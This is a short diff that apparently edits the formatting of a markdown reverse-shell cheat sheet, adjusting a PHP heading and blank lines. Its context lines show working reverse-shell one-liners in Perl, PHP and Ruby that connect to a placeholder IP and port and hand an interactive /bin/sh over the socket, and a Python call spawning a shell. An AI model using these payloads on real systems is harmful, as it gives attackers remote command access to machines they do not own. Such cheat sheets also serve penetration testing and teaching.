@@ -39,7 +39,8 @@ p=subprocess.call(["/bin/sh", "-i"])
 ```perl
 perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
-##PHP
+
+## PHP
 
 ```php
 php -r '$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -55,6 +56,7 @@ php -r '$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```ruby
 ruby -rsocket -e'f=TCPSocket.open("$IP",$PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
+
 ## Java
 
 ```java
